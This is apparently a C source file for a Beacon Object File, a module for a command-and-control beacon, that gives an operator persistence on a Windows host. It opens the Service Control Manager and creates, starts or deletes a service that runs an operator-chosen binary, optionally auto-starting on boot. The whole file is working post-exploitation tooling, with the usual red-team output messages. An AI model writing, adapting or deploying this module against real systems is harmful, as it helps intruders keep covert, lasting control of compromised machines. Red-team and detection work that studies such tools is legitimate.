#include <windows.h>
#include <stdio.h>
#include "../_include/beacon.h"

// Service Persistence
// Creates a Windows service for persistence

DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
DECLSPEC_IMPORT WINADVAPI SC_HANDLE WINAPI ADVAPI32$CreateServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword);
DECLSPEC_IMPORT WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$DeleteService(SC_HANDLE hService);
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors);
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE hSCObject);

#ifdef BOF
void go(char *args, int len)
{
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int action = BeaconDataInt(&parser);  // 0 = create, 1 = delete, 2 = start
    CHAR* serviceName = BeaconDataExtract(&parser, NULL);
    CHAR* displayName = BeaconDataExtract(&parser, NULL);
    CHAR* binaryPath = BeaconDataExtract(&parser, NULL);
    int startType = BeaconDataInt(&parser);  // 2 = AUTO_START, 3 = DEMAND_START
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Service Persistence\n");
    
    // Open Service Control Manager
    SC_HANDLE hSCM = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open Service Control Manager\n");
        BeaconPrintf(CALLBACK_ERROR, "[-] Error: %d\n", KERNEL32$GetLastError());
        BeaconPrintf(CALLBACK_ERROR, "[-] Tip: This requires Administrator privileges\n");
        return;
    }
    
    if (action == 0)  // Create service
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Creating service...\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Service Name: %s\n", serviceName);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Display Name: %s\n", displayName);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Binary Path: %s\n", binaryPath);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Start Type: %s\n", (startType == 2) ? "AUTO_START" : "DEMAND_START");
        
        SC_HANDLE hService = ADVAPI32$CreateServiceA(
            hSCM,
            serviceName,
            displayName,
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            startType,
            SERVICE_ERROR_IGNORE,
            binaryPath,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL
        );
        
        if (!hService)
        {
            DWORD error = KERNEL32$GetLastError();
            if (error == ERROR_SERVICE_EXISTS)
            {
                BeaconPrintf(CALLBACK_ERROR, "[-] Service already exists\n");
                BeaconPrintf(CALLBACK_OUTPUT, "[*] Tip: Use delete action first, then recreate\n");
            }
            else
            {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create service\n");
                BeaconPrintf(CALLBACK_ERROR, "[-] Error: %d\n", error);
            }
            ADVAPI32$CloseServiceHandle(hSCM);
            return;
        }
        
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully created service\n");
        
        if (startType == SERVICE_AUTO_START)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Service will start automatically on boot\n");
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Service created as DEMAND_START\n");
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Use 'start' action to start the service manually\n");
        }
        
        ADVAPI32$CloseServiceHandle(hService);
    }
    else if (action == 1)  // Delete service
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Deleting service...\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Service Name: %s\n", serviceName);
        
        SC_HANDLE hService = ADVAPI32$OpenServiceA(hSCM, serviceName, DELETE);
        if (!hService)
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open service\n");
            BeaconPrintf(CALLBACK_ERROR, "[-] Error: %d\n", KERNEL32$GetLastError());
            ADVAPI32$CloseServiceHandle(hSCM);
            return;
        }
        
        if (ADVAPI32$DeleteService(hService))
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted service\n");
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to delete service\n");
            BeaconPrintf(CALLBACK_ERROR, "[-] Error: %d\n", KERNEL32$GetLastError());
        }
        
        ADVAPI32$CloseServiceHandle(hService);
    }
    else if (action == 2)  // Start service
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting service...\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Service Name: %s\n", serviceName);
        
        SC_HANDLE hService = ADVAPI32$OpenServiceA(hSCM, serviceName, SERVICE_START);
        if (!hService)
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open service\n");
            BeaconPrintf(CALLBACK_ERROR, "[-] Error: %d\n", KERNEL32$GetLastError());
            ADVAPI32$CloseServiceHandle(hSCM);
            return;
        }
        
        if (ADVAPI32$StartServiceA(hService, 0, NULL))
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully started service\n");
        }
        else
        {
            DWORD error = KERNEL32$GetLastError();
            if (error == ERROR_SERVICE_ALREADY_RUNNING)
            {
                BeaconPrintf(CALLBACK_OUTPUT, "[*] Service is already running\n");
            }
            else
            {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to start service\n");
                BeaconPrintf(CALLBACK_ERROR, "[-] Error: %d\n", error);
            }
        }
        
        ADVAPI32$CloseServiceHandle(hService);
    }
    
    ADVAPI32$CloseServiceHandle(hSCM);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Service operation completed\n");
}
#endif

